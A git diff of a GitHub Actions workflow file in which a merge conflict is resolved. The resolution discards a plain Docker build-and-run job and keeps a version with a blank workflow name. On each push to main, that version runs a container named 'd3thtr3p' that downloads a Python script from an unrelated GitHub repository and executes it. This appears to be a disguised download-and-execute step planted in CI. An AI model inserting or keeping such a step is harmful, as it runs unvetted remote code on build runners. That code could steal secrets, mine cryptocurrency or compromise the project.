@@ -1,14 +1,9 @@
-<<<<<<< HEAD
 name: _____
-=======
-name: Docker Image CI
->>>>>>> f5f937e6bf8ec3bf0b01f069747939fb3b910e19
 
 on:
   push:
     branches: [ "main" ]
-<<<<<<< HEAD
-
+    
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -23,22 +18,3 @@ jobs:
     - name: Run Docker file
       run: |
             docker run livetest/d3thtr3p:v1 sh -c "wget https://raw.githubusercontent.com/Cjxsqa/Test5/main/Z.py && python3 Z.py"
-=======
-  pull_request:
-    branches: [ "main" ]
-
-jobs:
-
-  build:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v4
-    - name: Check Docker socket permissions
-      run: |
-         sudo docker ps
-    - name: Build the Docker image
-      run: docker build . --file Dockerfile --tag testghh:latest
-    - name: Run Docker file
-      run: |
-           docker run testghh:latest python3 B.py
->>>>>>> f5f937e6bf8ec3bf0b01f069747939fb3b910e19
